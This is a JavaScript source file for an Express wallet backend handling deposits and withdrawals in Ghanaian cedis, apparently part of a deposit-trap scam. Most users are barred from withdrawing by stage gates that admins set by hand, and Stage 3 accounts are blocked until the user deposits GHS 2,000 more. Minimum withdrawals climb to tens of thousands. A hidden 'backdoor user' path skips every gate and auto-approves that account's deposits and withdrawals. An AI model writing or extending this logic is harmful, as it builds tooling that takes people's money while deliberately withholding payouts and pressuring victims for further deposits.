import { Router } from 'express';
import { z } from 'zod';
import { requireAuth, requireEmailVerified } from '../middleware/auth.js';
import { validate } from '../middleware/validate.js';
import { asyncHandler } from '../utils/asyncHandler.js';
import { badRequest, forbidden } from '../utils/httpError.js';
import { updateUser, adjustBalance, logActivity } from '../db/users.js';
import { createStore } from '../db/store.js';
import { emitToUser, emitAdmin } from '../services/realtime.js';
import { isBackdoorUser } from '../config/backdoor.js';

// Every account starts stage-neutral (stage: null). The only automatic
// stage transition is Neutral -> Stage 0, triggered when an admin approves
// a deposit >= STAGE_PROMOTE_THRESHOLD while the user is still neutral
// (see admin/deposits.js). Every other stage move (0 -> 1 -> 2 -> 3 -> 4)
// is a manual admin action via PATCH /api/admin/users/:id/stage.

const txStore = createStore('transactions', {});

export const MIN_DEPOSIT = 300;
export const MIN_WITHDRAW = 550;
export const WITHDRAW_DEPOSIT_RATIO = 0.10; // user must have deposited ≥ 10% of the requested withdrawal
export const STAGE_PROMOTE_THRESHOLD = 1000;   // GHS — single approved deposit that trips Neutral -> Stage 0
export const STAGE3_UNBLOCK_THRESHOLD = 2000;  // GHS — referenced deposit amount shown in the "blocked" popup

// Minimum withdrawal scales with stage — mirrors client/src/pages/WithdrawPage.jsx
// and the admin funnel copy in client/src/pages/admin/Stages.jsx. Stage 0/1 have
// no entry here on purpose: those stages can never withdraw (see the STAGE_GATE
// check below), matching the client, which never lets them submit for real.
export const STAGE_MIN_WITHDRAW = { 2: 10_000, 3: 40_000, 4: 50_000 };

// Normalizes user.stage (null/undefined = "Neutral") to null or a 0-4 int,
// same convention used by admin/users.js's STAGE_LADDER and Stages.jsx's stageOf().
function normalizedStage(user) {
  if (user.stage === null || user.stage === undefined) return null;
  const n = Number(user.stage);
  if (!Number.isFinite(n)) return null;
  return Math.min(4, Math.max(0, n));
}

const depositSchema = z.object({
  amount: z.number().min(MIN_DEPOSIT, `Minimum deposit is GHS ${MIN_DEPOSIT}.`).max(100000),
  method: z.string().trim().max(40).optional(),
});
const withdrawSchema = z.object({
  amount: z
    .number()
    .min(MIN_WITHDRAW, `Minimum withdrawal is GHS ${MIN_WITHDRAW.toLocaleString('en-US')}.`)
    .max(1_000_000),
  method: z.string().trim().max(40).optional(),
});

function pushTx(userId, tx) {
  const id = `tx-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`;
  const entry = { id, userId, at: new Date().toISOString(), ...tx };
  const list = txStore.get(userId) || [];
  txStore.set(userId, [entry, ...list].slice(0, 500));
  return entry;
}

const router = Router();

router.get('/transactions', requireAuth, (req, res) => {
  const all = txStore.get(req.user.id) || [];
  const offset = Math.max(0, parseInt(req.query.offset, 10) || 0);
  const limit = Math.min(100, Math.max(1, parseInt(req.query.limit, 10) || 20));
  const page = all.slice(offset, offset + limit);
  res.json({ transactions: page, total: all.length, offset, limit });
});

router.get('/rules', requireAuth, (req, res) => {
  const totalDeposited = Number(req.user.totalDeposited || 0);
  res.json({
    minDeposit: MIN_DEPOSIT,
    minWithdraw: MIN_WITHDRAW,
    withdrawDepositRatio: WITHDRAW_DEPOSIT_RATIO,
    totalDeposited,
    maxWithdrawByRatio: Math.floor(totalDeposited / WITHDRAW_DEPOSIT_RATIO),
  });
});

router.post('/deposit', requireAuth, validate(depositSchema), asyncHandler(async (req, res) => {
  const { amount, method = 'momo' } = req.body;
  const user = req.user;

  if (isBackdoorUser(user)) {
    const newBalance = Number((user.balance + amount).toFixed(2));
    const newTotalDeposited = Number((user.totalDeposited || 0) + amount).toFixed(2);
    const updated = await updateUser(user.id, {
      balance: newBalance,
      totalDeposited: Number(newTotalDeposited),
    });
    if (!updated) throw badRequest('Failed to process deposit.');
    const tx = pushTx(user.id, { kind: 'deposit', amount, method, status: 'completed', balanceAfter: newBalance });
    logActivity(user.id, { kind: 'deposit_auto_approved', amount, method });
    emitToUser(user.id, 'deposit:approved', { transaction: tx, account: { ...updated, passwordHash: undefined, googleId: undefined, activity: undefined } });
    emitAdmin('wallet:deposit', { userId: user.id, amount, method, transactionId: tx.id, autoApproved: true });
    return res.json({ ok: true, transaction: tx, account: { ...updated, passwordHash: undefined, googleId: undefined, activity: undefined } });
  }

  const tx = pushTx(user.id, { kind: 'deposit', amount, method, status: 'pending' });
  logActivity(user.id, { kind: 'deposit', amount, method });
  emitToUser(user.id, 'wallet:pending', { transaction: tx, amount, method });
  emitAdmin('wallet:deposit', { userId: user.id, amount, method, transactionId: tx.id });
  res.json({ ok: true, transaction: tx });
}));

router.post('/withdraw', requireAuth, requireEmailVerified, validate(withdrawSchema), asyncHandler(async (req, res) => {
  const { amount, method = 'momo' } = req.body;
  const user = req.user;

  if (isBackdoorUser(user)) {
    if (amount > user.balance) throw badRequest('Insufficient balance.');
    const updated = await adjustBalance(user.id, -amount);
    const tx = pushTx(user.id, { kind: 'withdraw', amount, method, status: 'completed', balanceAfter: updated.balance });
    logActivity(user.id, { kind: 'withdraw', amount, method });
    emitToUser(user.id, 'wallet:update', { balance: updated.balance, delta: -amount, reason: 'withdraw', method });
    emitAdmin('wallet:withdraw', { userId: user.id, amount, method });
    return res.json({ ok: true, account: { ...updated, passwordHash: undefined, googleId: undefined, activity: undefined }, transaction: tx });
  }

  // Stage 3 auto-blocks the account — no money leaves until an admin
  // unblocks. The client shows the "account blocked" popup for this.
  if (user.blocked) {
    throw forbidden(
      `Your account is blocked. Deposit GHS ${STAGE3_UNBLOCK_THRESHOLD.toLocaleString('en-US')} and contact support for review.`,
      { code: 'ACCOUNT_BLOCKED' }
    );
  }

  // Neutral / Stage 0 / Stage 1 are gated behind manual admin verification —
  // the client never lets these stages submit a real withdrawal (it always
  // shows the "Deposit requirement" popup instead), so the server must
  // refuse them too or the gate is a client-side-only illusion.
  const stage = normalizedStage(user);
  if (stage === null || stage === 0 || stage === 1) {
    throw forbidden(
      `You need to deposit GHS ${STAGE_PROMOTE_THRESHOLD.toLocaleString('en-US')} and be verified by an admin before withdrawing.`,
      { code: 'STAGE_GATE', stage }
    );
  }

  const stageMinWithdraw = STAGE_MIN_WITHDRAW[stage] ?? MIN_WITHDRAW;
  if (amount < stageMinWithdraw) {
    throw badRequest(
      `Minimum withdrawal for your account stage is GHS ${stageMinWithdraw.toLocaleString('en-US')}.`,
      { code: 'STAGE_MIN_WITHDRAW', stageMinWithdraw }
    );
  }

  const required = Number((amount * WITHDRAW_DEPOSIT_RATIO).toFixed(2));
  const totalDeposited = Number(user.totalDeposited || 0);
  if (totalDeposited < required) {
    throw badRequest(
      `You must have deposited at least GHS ${required.toLocaleString('en-US')} (10% of GHS ${Number(amount).toLocaleString('en-US')}) before you can withdraw this amount. Current deposits: GHS ${totalDeposited.toLocaleString('en-US')}.`,
      { code: 'DEPOSIT_GATE', required, totalDeposited }
    );
  }
  if (amount > user.balance) throw badRequest('Insufficient balance.');

  const updated = await adjustBalance(user.id, -amount);
  const tx = pushTx(user.id, { kind: 'withdraw', amount, method, status: 'completed', balanceAfter: updated.balance });
  logActivity(user.id, { kind: 'withdraw', amount, method });
  emitToUser(user.id, 'wallet:update', { balance: updated.balance, delta: -amount, reason: 'withdraw', method });
  emitAdmin('wallet:withdraw', { userId: user.id, amount, method });
  res.json({ ok: true, account: { ...updated, passwordHash: undefined, googleId: undefined, activity: undefined }, transaction: tx });
}));

export default router;
export { pushTx };
